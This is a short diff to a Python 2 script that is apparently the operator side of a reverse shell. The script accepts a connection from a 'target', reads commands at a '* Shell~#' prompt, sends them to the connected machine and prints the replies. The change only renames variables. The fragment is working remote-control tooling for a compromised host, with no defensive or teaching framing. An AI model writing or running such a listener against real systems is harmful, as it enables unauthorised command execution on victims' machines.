@@ -13,12 +13,12 @@ target, ip = s.accept()
 print("Target Connected!")
 
 while True:
-    message = raw_input("* Shell~#%s: " % str(ip))
-    target.send(message)
-    if message == "q":
+    command = raw_input("* Shell~#%s: " % str(ip))
+    target.send(command)
+    if command == "q":
         break
     else:
-        answer = target.recv(1024)
-        print(answer)
+        result = target.recv(1024)
+        print(result)
 
 s.close()
